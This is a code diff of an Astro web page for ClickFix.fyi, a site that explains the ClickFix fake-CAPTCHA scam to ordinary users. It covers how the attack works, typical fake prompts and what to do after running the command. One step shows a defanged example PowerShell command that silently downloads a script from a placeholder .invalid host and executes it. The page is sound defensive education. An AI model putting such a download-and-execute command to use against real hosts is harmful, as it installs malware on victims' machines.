@@ -1,408 +1,221 @@
 ---
 import Layout from "../layouts/Layout.astro";
 import Header from "../components/Header.astro";
+import InteractiveDemo from "../components/Demo.astro";
+import NewsComponent from "../components/News.astro";
 ---
 
-<Layout title="ClickFix.fyi - Learn About the ClickFix Scam">
-	<Header />
+<Layout title="ClickFix: from fake CAPTCHA to command execution — ClickFix.fyi" description="A working ClickFix demo, an explanation of the attack, and steps to take if you ran the command.">
+  <Header />
 
-	<main>
-		<section class="hero section container">
-			<div class="hero-content">
-				<h1>What is ClickFix?</h1>
-				<p class="hero-lead">
-					ClickFix is a scam that tricks you into running malicious
-					code on your own computer. It works by making you think your
-					browser or computer has a problem that needs fixing.
-				</p>
+  <main id="main-content" class="docs-layout container">
+    <aside class="docs-nav" aria-label="On this page">
+      <p>On this page</p>
+      <nav>
+        <a href="#demo">Demo</a>
+        <a href="#how-it-works">How it works</a>
+        <a href="#common-prompts">Common fake prompts</a>
+        <a href="#already-ran-it">If you ran it</a>
+        <a href="#sources">News</a>
+      </nav>
+    </aside>
 
-				<div class="warning-box">
-					<h3>The Key Trick:</h3>
-					<p>Instead of downloading a file, ClickFix tells you to:</p>
-					<ol>
-						<li>
-							Press <strong>Windows + R</strong> (opens a system command
-							window)
-						</li>
-						<li>
-							Press <strong>Ctrl + V</strong> (pastes a hidden command)
-						</li>
-						<li>
-							Press <strong>Enter</strong> (runs the malicious code)
-						</li>
-					</ol>
-					<p style="margin-top: 1rem;">
-						Because <em>you're</em> the one pressing the keys, your computer's
-						security software often doesn't stop it.
-					</p>
-				</div>
-			</div>
-		</section>
+    <article class="docs-article">
+      <header class="article-header" id="overview">
+        <h1>ClickFix: from fake CAPTCHA to command execution</h1>
+        <p class="article-summary">
+          ClickFix is a social engineering technique that uses fake CAPTCHAs or error messages to trick someone into copying and running a command. The command typically downloads malware.
+        </p>
+        <p class="demo-intro">The interactive demo below reproduces this sequence using a harmless script.</p>
+      </header>
 
-		<section class="section container">
-			<h2>How Big is the Problem?</h2>
-			<div class="stats-grid">
-				<div class="stat-card card">
-					<div class="stat-number">517%</div>
-					<div class="stat-label">
-						Increase in ClickFix attacks in early 2025 (ESET)
-					</div>
-				</div>
-				<div class="stat-card card">
-					<div class="stat-number">400%</div>
-					<div class="stat-label">
-						Growth in malicious ClickFix URLs from 2024 to 2025
-						(Proofpoint)
-					</div>
-				</div>
-				<div class="stat-card card">
-					<div class="stat-number">#2</div>
-					<div class="stat-label">
-						Most common attack method after phishing (ESET, 2025)
-					</div>
-				</div>
-			</div>
-		</section>
+      <section id="demo" class="demo-section">
+        <InteractiveDemo />
+      </section>
 
-		<section class="section container">
-			<div class="malware-box">
-				<h2>What Happens When You Run It?</h2>
-				<p>
-					The malicious code executes immediately and installs "infostealer"
-					malware that silently:
-				</p>
-				<ul>
-					<li>
-						<strong>Steals all saved passwords</strong> from your browser
-					</li>
-					<li>
-						<strong>Hijacks your active sessions</strong> (steals login
-						cookies)
-					</li>
-					<li>
-						<strong>Drains cryptocurrency wallets</strong> found on the
-						device
-					</li>
-					<li>
-						<strong>Captures screenshots</strong> of your data
-					</li>
-				</ul>
+      <section id="how-it-works">
+        <h2>How it works</h2>
+        <p>ClickFix is a way to deliver malware, not a specific piece of malware. What gets installed varies between campaigns.</p>
+        <ol class="sequence detailed-sequence">
+          <li><div><strong>The page shows a fake prompt.</strong><p>A malicious or compromised page displays a familiar CAPTCHA, browser error, meeting problem, or document error.</p></div></li>
+          <li><div><strong>The button copies a command.</strong><p>The button claims to copy a verification code or fix. It copies a command instead.</p></div></li>
+          <li><div><strong>The user opens a system tool.</strong><p>The page directs the user to open Run, PowerShell, Terminal, Command Prompt, or File Explorer.</p></div></li>
+          <li><div><strong>The user runs the command.</strong><p>The system tool executes whatever the attacker placed on the clipboard.</p><pre aria-label="Defanged example ClickFix command"><code>powershell.exe -NoProfile -WindowStyle Hidden -Command "irm https://secure-check.example.invalid/update.ps1 | iex"</code></pre><small>The reserved <code>.invalid</code> domain cannot resolve, so this example cannot download a payload.</small></div></li>
+          <li><div><strong>The command downloads malware.</strong><p>The downloaded malware then runs on the device.</p></div></li>
+        </ol>
 
-				<h3 style="margin-top: 2rem; color: #991b1b;">Common Malware Families Used</h3>
-				<p>
-					These attacks typically distribute notorious malware families including:
-				</p>
-				<ul>
-					<li>
-						<strong>Lumma Stealer (LummaC2)</strong> - The most common.
-						Steals passwords, cookies, and crypto wallets.
-					</li>
-					<li>
-						<strong>Vidar Stealer</strong> - Similar to Lumma, focuses
-						on browser data and crypto.
-					</li>
-					<li>
-						<strong>DarkGate</strong> - A "Remote Access Trojan" that
-						gives attackers full control of your computer.
-					</li>
-					<li>
-						<strong>AsyncRAT / DCRAT</strong> - Tools that let attackers
-						spy on you and control your PC remotely.
-					</li>
-				</ul>
-			</div>
-		</section>
+      </section>
 
-		<section class="demo-cta section container">
-			<div class="demo-cta-content card">
-				<h2>See What a ClickFix Attack Looks Like</h2>
-				<p>
-					We've created a safe, educational simulation that shows you
-					exactly what happens during a ClickFix attack. No actual
-					malware is involved.
-				</p>
-				<a href="/demo" class="btn btn-primary"
-					>Try the Interactive Demo</a
-				>
-			</div>
-		</section>
+      <section id="common-prompts">
+        <h2>Common fake prompts</h2>
+        <ul class="disguise-list">
+          <li>“Verify you are human”</li>
+          <li>“Your browser needs an update”</li>
+          <li>“The document cannot be displayed”</li>
+          <li>“Your microphone or meeting connection failed”</li>
+        </ul>
+      </section>
 
-		<section class="timeline-box container">
-			<h2>Timeline: How ClickFix Evolved</h2>
-			<div class="timeline">
-				<div class="timeline-item">
-					<div class="timeline-date">March 2024</div>
-					<div class="timeline-content">
-						<strong>First Major Campaigns</strong>
-						<p>
-							Proofpoint and Microsoft detect TA571 and Storm-1811 using ClickFix techniques in the wild.
-						</p>
-					</div>
-				</div>
-				<div class="timeline-item">
-					<div class="timeline-date">May 2024</div>
-					<div class="timeline-content">
-						<strong>ClearFake Adoption</strong>
-						<p>
-							The "ClearFake" cybercrime cluster adopts ClickFix, injecting fake browser updates into compromised sites.
-						</p>
-					</div>
-				</div>
-				<div class="timeline-item">
-					<div class="timeline-date">Aug 2024</div>
-					<div class="timeline-content">
-						<strong>Google Meet & Mac Variants</strong>
-						<p>
-							Groups like "Slavic Nation Empire" launch fake Google Meet campaigns targeting both Windows and macOS.
-						</p>
-					</div>
-				</div>
-				<div class="timeline-item">
-					<div class="timeline-date">Early 2025</div>
-					<div class="timeline-content">
-						<strong>Massive Surge</strong>
-						<p>
-							Attacks increase by over 500% in H1 2025, becoming the second most common attack method globally.
-						</p>
-					</div>
-				</div>
-			</div>
-		</section>
+      <section id="already-ran-it">
+        <h2>If you ran the command</h2>
+        <div class="warning compact" role="note">
+          <strong>Treat the device as compromised.</strong>
+        </div>
+        <ol class="response-list">
+          <li><strong>Disconnect the affected computer.</strong> Turn off Wi-Fi and unplug the network cable.</li>
+          <li><strong>Secure your accounts.</strong> From another device, sign out active sessions and change credentials that may have been exposed.</li>
+          <li><strong>Clean or rebuild the device.</strong> A clean antivirus scan does not prove the malware is gone. Reinstall the operating system or have the device inspected.</li>
+        </ol>
+      </section>
 
-		<section class="section container">
-			<div class="protection-card">
-				<h2>How to Protect Yourself</h2>
-				<ul class="protection-list">
-					<li>
-						<strong>Never paste commands from websites</strong> into
-						your computer's Run dialog or terminal
-					</li>
-					<li>
-						<strong>Be suspicious of "fix" instructions</strong> that
-						involve keyboard shortcuts
-					</li>
-					<li>
-						<strong>Check the URL</strong> - Real error messages don't
-						come from random websites
-					</li>
-					<li>
-						<strong>When in doubt, close the tab</strong> and navigate
-						to the site directly
-					</li>
-				</ul>
-			</div>
-		</section>
-	</main>
+      <section id="sources">
+        <h2>ClickFix news</h2>
+        <NewsComponent />
+      </section>
+    </article>
+  </main>
 </Layout>
 
 <style>
-	.hero {
-		padding-top: 3rem;
-		padding-bottom: 2rem;
-	}
+  .docs-layout {
+    display: grid;
+    grid-template-columns: 190px minmax(0, 900px);
+    gap: clamp(3rem, 8vw, 7rem);
+    justify-content: center;
+    padding-block: 3rem 6rem;
+  }
 
-	.hero-content {
-		max-width: 800px;
-		margin: 0 auto;
-		text-align: center;
-	}
+  .docs-nav {
+    position: sticky;
+    top: 104px;
+    align-self: start;
+    border-left: 1px solid var(--line);
+    padding-left: 1rem;
+  }
 
-	.hero h1 {
-		font-size: 3rem;
-		margin-bottom: 1rem;
-		line-height: 1.1;
-	}
+  .docs-nav > p {
+    margin-bottom: 0.7rem;
+    color: var(--ink);
+    font-size: 0.78rem;
+    font-weight: 700;
+  }
 
-	.hero-lead {
-		font-size: 1.4rem;
-		color: #4b5563;
-		margin-bottom: 2rem;
-		line-height: 1.5;
-	}
+  .docs-nav nav {
+    display: grid;
+    gap: 0.55rem;
+  }
 
-	.warning-box {
-		background: #fef2f2;
-		border: 2px solid #dc2626;
-		border-radius: 8px;
-		padding: 2rem;
-		margin-top: 2rem;
-		line-height: 1.6;
-		text-align: left;
-		max-width: 700px;
-		margin-left: auto;
-		margin-right: auto;
-	}
+  .docs-nav a {
+    color: var(--ink-soft);
+    font-size: 0.82rem;
+    line-height: 1.35;
+    text-decoration: none;
+  }
 
-	.warning-box h3 {
-		color: #991b1b;
-		margin-top: 0;
-		margin-bottom: 1rem;
-	}
+  .docs-nav a:hover { color: var(--signal); }
 
-	.warning-box ol {
-		margin: 1rem 0;
-		padding-left: 1.5rem;
-	}
+  .docs-article { min-width: 0; }
 
-	.warning-box li {
-		margin-bottom: 0.5rem;
-		font-size: 1.1rem;
-	}
+  .article-header {
+    padding-bottom: 0;
+  }
 
-	/* Stats Grid */
-	.stats-grid {
-		display: grid;
-		grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-		gap: 1.5rem;
-		margin: 2rem 0;
-	}
+  .article-header h1 {
+    margin-bottom: 1rem;
+    font-size: clamp(2.3rem, 5vw, 3.75rem);
+  }
 
-	.stat-card {
-		text-align: center;
-		padding: 2rem;
-		background: white; /* Ensure card look */
-        border: 1px solid #e5e7eb; /* Add border for definition */
-		border-radius: 8px;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.05);
-	}
+  .article-summary {
+    max-width: 44rem;
+    margin: 0;
+    color: var(--ink-soft);
+    font-size: clamp(1.05rem, 1.8vw, 1.2rem);
+    line-height: 1.55;
+  }
 
-	.stat-number {
-		display: block;
-		font-size: 3rem;
-		font-weight: 800;
-		color: var(--accent-color);
-		margin-bottom: 0.5rem;
-		line-height: 1;
-	}
+  .demo-intro {
+    max-width: 44rem;
+    margin: 0.85rem 0 0;
+    color: var(--ink-soft);
+    font-size: clamp(1.05rem, 1.8vw, 1.2rem);
+    line-height: 1.55;
+  }
 
-	.stat-label {
-		font-size: 1.1rem;
-		color: #4b5563;
-		line-height: 1.4;
-	}
+  .docs-article section {
+    padding-block: 2.75rem;
+    border-bottom: 1px solid var(--line);
+    scroll-margin-top: 100px;
+  }
 
-	/* Malware Box */
-	.malware-box {
-		margin: 2rem 0;
-	}
+  .docs-article .demo-section { padding-top: 1.5rem; }
 
-	.malware-box h3 {
-		margin-top: 2rem;
-		color: #991b1b;
-	}
+  .docs-article section h2 {
+    margin-bottom: 1rem;
+    font-size: clamp(1.65rem, 3vw, 2.15rem);
+  }
 
-	.malware-box ul {
-		margin-top: 1rem;
-		padding-left: 1.25rem;
-	}
+  .docs-article section > p,
+  .docs-article li {
+    color: var(--ink-soft);
+    font-size: 1rem;
+  }
 
-	.malware-box li {
-		margin-bottom: 0.75rem;
-	}
+  .warning {
+    margin-block: 2rem;
+    border: 1px solid #d8a6a0;
+    border-left: 5px solid var(--signal);
+    padding: 1.1rem 1.25rem;
+    background: #fff5f4;
+  }
 
-	/* Timeline */
-	.timeline-box {
-		margin: 3rem auto;
-		padding: 2rem 1rem;
-		border-top: 1px solid var(--border-color);
-		border-bottom: 1px solid var(--border-color);
-		max-width: 800px;
-	}
+  .warning strong { color: var(--signal-dark); }
+  .warning p { margin: 0.35rem 0 0; color: var(--ink-soft); }
+  .warning.compact { margin-block: 1.25rem 1.75rem; }
 
-	.timeline {
-		margin-top: 2rem;
-		position: relative;
-		padding-left: 2rem;
-	}
+  .sequence {
+    margin: 1.5rem 0;
+    padding: 0;
+    list-style: none;
+    counter-reset: step;
+  }
 
-	.timeline:before {
-		content: "";
-		position: absolute;
-		left: 6px;
-		top: 0;
-		bottom: 0;
-		width: 2px;
-		background: var(--border-color);
-	}
+  .sequence li {
+    display: grid;
+    grid-template-columns: 2rem minmax(0, 1fr);
+    gap: 0.8rem;
+    padding: 1rem 0;
+    counter-increment: step;
+  }
 
-	.timeline-item {
-		position: relative;
-		margin-bottom: 2rem;
-		padding-left: 2rem;
-	}
+  .sequence li > div { min-width: 0; }
 
-	.timeline-item:before {
-		content: "";
-		position: absolute;
-		left: -2rem;
-		top: 0.25rem;
-		width: 12px;
-		height: 12px;
-		border-radius: 50%;
-		background: var(--accent-color);
-		border: 2px solid white;
-		box-shadow: 0 0 0 2px var(--accent-color);
-	}
+  .sequence li + li { border-top: 1px solid #d9dee1; }
+  .sequence li::before { content: counter(step) "."; color: var(--signal); font-family: var(--font-mono); font-weight: 700; }
+  .sequence strong { color: var(--ink); }
+  .sequence p { margin: 0.25rem 0 0; }
 
-	.timeline-date {
-		font-size: 0.85rem;
-		font-weight: 700;
-		color: var(--accent-color);
-		text-transform: uppercase;
-		margin-bottom: 0.5rem;
-	}
+  .detailed-sequence small { display: block; margin-top: 0.45rem; color: var(--ink-soft); }
+  pre { overflow-x: auto; margin: 0.9rem 0 0; border: 1px solid #3b4348; border-radius: 4px; padding: 0.9rem; background: #171c20; color: #e8ecee; }
+  pre code { padding: 0; background: transparent; }
+  .disguise-list { margin: 1.4rem 0 0; padding-left: 1.25rem; }
+  .disguise-list li { margin-bottom: 0.65rem; }
 
-	.timeline-content strong {
-		display: block;
-		font-size: 1.1rem;
-		margin-bottom: 0.25rem;
-	}
+  .response-list { padding-left: 1.35rem; }
+  .response-list li { margin-bottom: 0.9rem; padding-left: 0.3rem; }
+  .response-list strong { color: var(--ink); }
 
-	.timeline-content p {
-		margin: 0;
-		color: #6b7280;
-	}
+  .docs-article section:last-child { border-bottom: 0; }
 
-	/* CTA */
-	.demo-cta {
-		text-align: center;
-		padding: 2rem 0;
-	}
-	
-	.demo-cta-content {
-		max-width: 600px;
-		margin: 0 auto;
-		padding: 3rem;
-		background: #f0fdf4; /* Light green tint */
-		border: 1px solid #bbf7d0;
-	}
-	
-	.demo-cta h2 {
-		margin-top: 0;
-		color: #166534;
-	}
+  @media (max-width: 800px) {
+    .docs-layout { grid-template-columns: 1fr; gap: 0; padding-top: 2rem; }
+    .docs-nav { display: none; }
+  }
 
-	/* Protection */
-	.protection-card {
-		margin: 2rem 0;
-	}
-	
-	.protection-list {
-		margin-bottom: 0;
-		padding-left: 1.5rem;
-	}
-	
-	.protection-list li {
-		margin-bottom: 1rem;
-		font-size: 1.1rem;
-	}
-
-	@media (max-width: 768px) {
-		.hero h1 {
-			font-size: 2.5rem;
-		}
-		.timeline-box {
-			padding: 2rem 0;
-		}
-	}
+  @media (max-width: 520px) {
+    .docs-layout { padding-bottom: 3rem; }
+    .article-header h1 { font-size: 2rem; line-height: 1.08; }
+    .article-summary,
+    .demo-intro { font-size: 1rem; }
+    .docs-article section { padding-block: 2.25rem; }
+  }
 </style>
